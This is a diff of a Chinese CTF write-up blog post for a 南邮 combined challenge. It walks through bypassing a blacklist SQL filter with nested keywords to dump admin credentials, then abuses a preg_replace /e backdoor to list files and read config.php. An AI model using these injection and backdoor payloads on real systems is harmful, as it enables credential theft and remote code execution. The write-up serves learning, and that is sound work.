@@ -196,7 +196,26 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123; </div><div class="line">    $keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</div><div class="line">     $info=strtolower($content); </div><div class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123; </div><div class="line">        $info=str_replace($keyword[$i], <span class="string">''</span>,$info); </div><div class="line">    &#125; <span class="keyword">return</span> $info; </div><div class="line">&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
 <p>这是一个基于黑名单的过滤函数，将所有的关键字转换位空。我们马上可以想到使用关键字嵌套的方式可以绕过。在<code>so.php</code>中使用了<code>mysql_real_escape_string</code>。</p>
 <p>它只转义 <strong>\x00、\n、\r、\、’、”、\x1a</strong>字符，这人使用的整型注入。</p>
-<p>根据之前信息收集，我们之后数据库中存在<code>admin</code>数据表。所以我们需要将<code>admin</code>表中的记录读取出来。</p>
+<h3 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h3><p>根据之前信息收集，我们之后数据库中存在<code>admin</code>数据表。所以我们需要将<code>admin</code>表中的记录读取出来。</p>
+<p>我们先猜解了message字段有4个，这个没有难度。就不给语句了。</p>
+<p>根据之前的信息，我们直接可以查询该密码，</p>
+<p>payload:<code>1/**/anANDd/**/1&gt;3/**/unUNIONion/**/selSELECTect/**/1,usernaNAMEme,userpaPASSss,4/**/frFROMom/**/admADMINin</code></p>
+<img src="/2017/09/11/南邮CTF综合题2WriteUp/3.png" alt="ByPupil" title="ByPupil">
+<p>根据我们之前的信息收集，我们知道这是每一个字符的ASCII码，</p>
+<img src="/2017/09/11/南邮CTF综合题2WriteUp/4.png" alt="ByPupil" title="ByPupil">
+<p>解码后的密码为：<code>fuckruntu</code>，登录后台，现在已经存在小马了。</p>
+<img src="/2017/09/11/南邮CTF综合题2WriteUp/5.png" alt="ByPupil" title="ByPupil">
+<p>要如何才能连上呢，想到了<code>about.php</code>这是一个可以读取文件的页面。</p>
+<img src="/2017/09/11/南邮CTF综合题2WriteUp/6.png" alt="ByPupil" title="ByPupil">
+<p>一看这个木马是一个回调后门，这儿主要利用了<code>preg_replace</code>函数的e模式。在e模式下，第二个参数会产生命令执行。</p>
+<p>我们可以构造语句进行目录枚举出来了：</p>
+<p><code>www=preg_replace&amp;wtf=var_dump(scandir(&#39;.&#39;))</code></p>
+<img src="/2017/09/11/南邮CTF综合题2WriteUp/7.png" alt="ByPupil" title="ByPupil">
+<p>直接读取<code>恭喜你获得flag2.txt</code>就可以获取到flag了。</p>
+<h3 id="0x04-搞事"><a href="#0x04-搞事" class="headerlink" title="0x04 搞事"></a>0x04 搞事</h3><p>突然想到，我要把这道题目<code>1:1</code>进行导出来。现在还不知道数据库是怎么设计的。还有一个config.php没有读出来呢。构造语句：</p>
+<p><code>www=preg_replace&amp;wtf=print_r(file_get_contents(&#39;config.php&#39;))</code></p>
+<img src="/2017/09/11/南邮CTF综合题2WriteUp/8.png" alt="ByPupil" title="ByPupil">
+<p>亲自测试了，数据库是可以连上的。当然作为白帽的我们不要搞破坏，从中学习到技巧最重要。</p>
 
       
 
